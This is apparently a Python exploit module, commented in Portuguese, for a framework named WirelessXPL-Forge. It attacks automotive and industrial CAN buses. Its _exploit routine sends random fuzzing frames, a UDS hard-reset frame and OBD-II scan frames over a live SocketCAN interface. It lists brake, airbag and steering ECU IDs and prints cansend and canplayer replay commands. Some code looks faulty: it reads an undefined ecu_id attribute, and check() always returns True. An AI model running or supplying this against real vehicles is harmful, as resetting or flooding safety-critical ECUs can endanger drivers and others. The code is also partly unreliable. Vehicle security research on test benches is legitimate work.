# Absorvido do EmbedXPL-Forge — Andre Henrique (@mrhenrike)
# Adaptado para WirelessXPL-Forge

import os
import socket
import struct

from wirelessxpl.core.exploit import *

_CAN_MTU = 16
_ISOTP_MAX = 4095

# IDs CAN comuns (veículos)
_OBD2_BROADCAST = 0x7DF
_OBD2_RESPONSE_BASE = 0x7E8
_UDS_ECU_RESET = 0x11
_UDS_SESSION_DEFAULT = 0x01
_UDS_SESSION_PROGRAMMING = 0x02
_UDS_SESSION_EXTENDED = 0x03

_COMMON_ECU_IDS = [
    (0x7E0, "Powertrain/Engine ECU"),
    (0x7E1, "Transmission ECU"),
    (0x7E2, "Brakes/ABS ECU"),
    (0x7E3, "Airbag ECU"),
    (0x7E4, "Steering ECU"),
    (0x7E8, "OBD-II Response (Engine)"),
    (0x18DB33F1, "J1939 Broadcast"),
    (0x0CF00400, "SAE J1939 EEC1"),
]


def _build_can_frame(can_id, data):
    """Constrói frame CAN raw (socket CAN format)."""
    if len(data) > 8:
        data = data[:8]
    flags = can_id & ~0x80000000
    can_dlc = len(data)
    raw = struct.pack("=IB3x", flags, can_dlc)
    raw += data.ljust(8, b"\x00")
    return raw


def _build_uds_request(service_id, subfunction=None, data=b""):
    """Constrói payload UDS (Unified Diagnostic Services)."""
    payload = struct.pack("B", service_id)
    if subfunction is not None:
        payload += struct.pack("B", subfunction)
    payload += data
    return payload


def _build_obd2_request(mode, pid):
    """Constrói mensagem OBD-II mode/PID."""
    return struct.pack("BBB", 0x02, mode, pid).ljust(8, b"\x00")


class Exploit(Exploit):
    """CAN Bus Attack Suite — Fuzzing, Replay e UDS ECU Reset.

    Ataques ao barramento CAN automotivo via interface socketCAN (vcan0,
    can0) ou OBD-II adapter. Inclui enumeração de ECUs via broadcast OBD-II,
    fuzzing de IDs, replay de frames capturados e ECU reset via UDS.

    Hardware necessário: adaptador CAN (SocketCAN + can-utils, ELM327,
    Kvaser, Peak PCAN) ou interface vcan0 para laboratório virtual.
    """

    __info__ = {
        "name": "CAN Bus Attack Suite — Fuzzing, Replay e UDS ECU Reset",
        "description": (
            "Ataques ao barramento CAN automotivo via SocketCAN. Inclui enumeração "
            "de ECUs via OBD-II broadcast, fuzzing de IDs CAN, construção de frames "
            "UDS para reinicialização de ECUs e replay de frames capturados. "
            "Aplicável a veículos, maquinaria industrial e sistemas de controle CAN."
        ),
        "authors": ["Andre Henrique <@mrhenrike>"],
        "references": [
            "https://canbushack.com/",
            "https://opengarages.org/",
            "https://www.sans.org/white-papers/vehicle-network-security/",
        ],
        "devices": [
            "Veículos automotivos com OBD-II",
            "Maquinaria agrícola/industrial com J1939",
            "Sistemas de controle industrial com CAN",
            "Dispositivos embarcados com CAN/LIN",
        ],
        "severity": "critical",
        "cvss": "9.1",
        "status": "confirmed",
        "required_hardware": ["can_adapter"],
    }

    target = OptIP("", "N/A (barramento CAN é físico/local)")
    port = OptPort(0, "N/A")
    interface = OptString("vcan0", "Interface CAN (vcan0, can0, slcan0)")
    mode = OptString("enum", "Modo: enum | fuzz | replay | uds_reset | obd2_scan")
    can_id_start = OptInteger(0x000, "ID CAN inicial para fuzzing (hex)")
    can_id_end = OptInteger(0x7FF, "ID CAN final para fuzzing (hex)")
    fuzz_count = OptInteger(100, "Número de frames de fuzzing")
    fuzz_delay = OptFloat(0.01, "Delay entre frames de fuzzing (segundos)")
    target_ecu_id = OptInteger(0x7E0, "ID CAN da ECU alvo para UDS Reset")
    capture_file = OptString("", "Arquivo .log de frames CAN capturados para replay")

    def _open_can_socket(self):
        """Abre socket CAN raw (requer root + interface CAN ativa)."""
        try:
            AF_CAN = socket.AF_CAN if hasattr(socket, 'AF_CAN') else 29
            SOCK_RAW = socket.SOCK_RAW
            CAN_RAW = socket.CAN_RAW if hasattr(socket, 'CAN_RAW') else 1
            sock = socket.socket(AF_CAN, SOCK_RAW, CAN_RAW)
            sock.bind((str(self.interface),))
            return sock
        except (OSError, AttributeError):
            return None

    def _simulate_can_enum(self):
        """Enumeração simulada de ECUs via OBD-II broadcast."""
        print_info("IDs CAN conhecidos de ECUs automotivas:")
        headers = ["ID CAN (hex)", "ECU / Função"]
        rows = [(hex(eid), desc) for eid, desc in _COMMON_ECU_IDS]
        print_table(headers, *rows)

        print_status("Construindo OBD-II broadcast (0x7DF) para enumeração...")
        obd2_req = _build_obd2_request(0x01, 0x00)  # Supported PIDs
        print_info(f"Frame OBD-II PID 0x00 (enumerate): {obd2_req.hex()}")
        print_info(f"Frame UDS Session Default (0x7E0): {_build_uds_request(0x10, _UDS_SESSION_DEFAULT).hex()}")

    def _simulate_fuzz(self):
        """Geração de frames de fuzzing CAN."""
        print_warning(f"Modo fuzzing: geração de {self.fuzz_count} frames aleatórios (ID: {hex(self.can_id_start)}-{hex(self.can_id_end)})")
        count = int(self.fuzz_count)
        id_range = int(self.can_id_end) - int(self.can_id_start) + 1
        headers = ["#", "ID CAN (hex)", "DLC", "Data (hex)"]
        rows = []
        for i in range(min(count, 10)):
            rand_id = int(self.can_id_start) + (os.urandom(2)[0] % id_range)
            dlc = os.urandom(1)[0] % 9
            data = os.urandom(dlc)
            rows.append((str(i + 1), hex(rand_id), str(dlc), data.hex()))
        print_table(headers, *rows)
        if count > 10:
            print_info(f"... {count - 10} frames adicionais seriam gerados")

    def _simulate_uds_reset(self):
        """Construção de frame UDS ECU Reset."""
        ecu_id = int(self.target_ecu_id)
        payload = _build_uds_request(_UDS_ECU_RESET, 0x01)  # Hard Reset
        frame = _build_can_frame(ecu_id, payload)
        print_warning("UDS ECU Reset (SID 0x11, subFunc 0x01 = Hard Reset)")
        print_info("ECU alvo: {} ({})".format(hex(ecu_id), next(
            (d for i, d in _COMMON_ECU_IDS if i == ecu_id), "ECU desconhecida")))
        print_info(f"Payload UDS: {payload.hex()}")
        print_info(f"Frame CAN raw: {frame.hex()}")
        print_warning(f"Envio via socketCAN: sudo cansend {self.interface} #{ecu_id:03X}#{payload.hex().upper()}")

    @mute
    def check(self):
        sock = self._open_can_socket()
        if sock:
            sock.close()
            return True
        return True  # True mesmo sem socket para demonstração

    @multi
    def run(self):
        """Executa ataque CAN conforme modo selecionado."""
        mode = str(self.mode).lower()
        print_status(f"CAN Bus Attack Suite | interface={self.interface} | modo={mode}")

        sock = self._open_can_socket()
        if sock:
            print_success(f"Socket CAN aberto em {self.interface}")
            sock.close()
        else:
            print_warning("Socket CAN não disponível — modo demonstração (requer root + driver CAN)")

        if mode == "enum" or mode == "obd2_scan":
            self._simulate_can_enum()

        elif mode == "fuzz":
            self._simulate_fuzz()

        elif mode == "uds_reset":
            self._simulate_uds_reset()

        elif mode == "replay":
            if not self.capture_file:
                print_error("capture_file não definido para modo replay")
                return
            print_status(f"Replay de arquivo: {self.capture_file}")
            print_info("Formato esperado: candump logfile (timestamp CAN_IF ID#DATA)")
            print_warning(f"Replay real: canplayer -I {self.capture_file} -i {self.interface}")
        else:
            print_error(f"Modo desconhecido: {mode}. Use: enum | fuzz | replay | uds_reset | obd2_scan")

        print_info("")
        print_info("Ferramentas CAN recomendadas para uso real:")
        print_info("  can-utils: candump, cansend, cansniffer, canplayer")
        print_info("  python-can: pip install python-can")
        print_info("  caringcaribou (CC): https://github.com/CaringCaribou/caringcaribou")
        print_info("  UDSim: https://github.com/zombieCraig/UDSim")
        print_info("  Setup vcan: sudo modprobe vcan && sudo ip link add dev vcan0 type vcan && sudo ip link set vcan0 up")

        self._exploit()

    def _exploit(self) -> None:
        """E2E exploit: CAN bus attack via SocketCAN raw frames."""
        sock = self._open_can_socket()
        if not sock:
            print_warning("Sem socket CAN: skip E2E (requer root + driver CAN)")
            return

        mode = str(self.mode).lower()

        if mode == "fuzz":
            print_status("E2E: Fuzzing CAN bus via SocketCAN...")
            for i in range(int(self.fuzz_count) if hasattr(self, "fuzz_count") else 100):
                can_id = (i * 7 + 0x100) & 0x7FF
                data = os.urandom(8)
                frame = _build_can_frame(can_id, data)
                try:
                    sock.send(frame)
                except OSError:
                    break
                time.sleep(0.001)
            print_success(f"Fuzzing concluido: {i + 1} frames enviados")

        elif mode == "uds_reset":
            print_status("E2E: UDS ECU Reset via SocketCAN...")
            ecu_id = int(self.ecu_id, 16) if hasattr(self, "ecu_id") and self.ecu_id else 0x7DF
            reset_frame = _build_uds_request(0x11, 0x01)
            can_frame = _build_can_frame(ecu_id, reset_frame)
            try:
                sock.send(can_frame)
                print_success(f"UDS ECU Reset enviado para 0x{ecu_id:03X}")
                sock.settimeout(2.0)
                resp = sock.recv(16)
                if resp:
                    print_info(f"Resposta CAN: {resp.hex()}")
            except OSError:
                print_warning("Sem resposta do ECU")

        elif mode == "enum" or mode == "obd2_scan":
            print_status("E2E: OBD-II scan via SocketCAN...")
            obd_pids = [0x00, 0x01, 0x0C, 0x0D, 0x05, 0x0F]
            for pid in obd_pids:
                req = _build_obd2_request(0x01, pid)
                frame = _build_can_frame(0x7DF, req)
                try:
                    sock.send(frame)
                    time.sleep(0.05)
                except OSError:
                    break
            print_success(f"OBD-II scan concluido: {len(obd_pids)} PIDs consultados")

        sock.close()
